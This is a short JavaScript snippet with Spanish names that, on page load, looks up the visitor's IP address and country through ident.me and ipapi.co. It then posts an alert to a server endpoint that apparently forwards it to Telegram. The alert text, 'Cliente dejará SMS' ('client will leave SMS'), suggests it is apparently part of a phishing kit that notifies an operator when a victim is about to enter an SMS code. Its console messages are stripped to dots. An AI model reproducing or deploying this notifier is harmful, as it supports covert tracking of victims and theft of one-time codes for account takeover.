function enviarMensajeTelegram(mensaje) {
    fetch('/enviar-alerta', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ mensaje })
    })
    .then(response => {
        if (!response.ok) throw new Error("Error en la solicitud");
        return response.json();
    })
    .then(data => {
        console.log(".");
    })
    .catch(error => {
        console.error(".", error);
    });
}

window.addEventListener("DOMContentLoaded", function() {
    fetch('https://ipv4.ident.me/json')
        .then(response => response.json())
        .then(ipData => {
            const ipv4 = ipData.ip;
            
            fetch(`https://ipapi.co/${ipv4}/json/`)
                .then(response => response.json())
                .then(countryData => {
                    const pais = countryData.country_name;
                    const mensajeAlerta = `⚠️Cliente dejará SMS⚠️:\n🌐 IP: ${ipv4} (${pais})`;
                    
                    setTimeout(() => {
                        enviarMensajeTelegram(mensajeAlerta);
                    }, 1000);
                });
        });
});
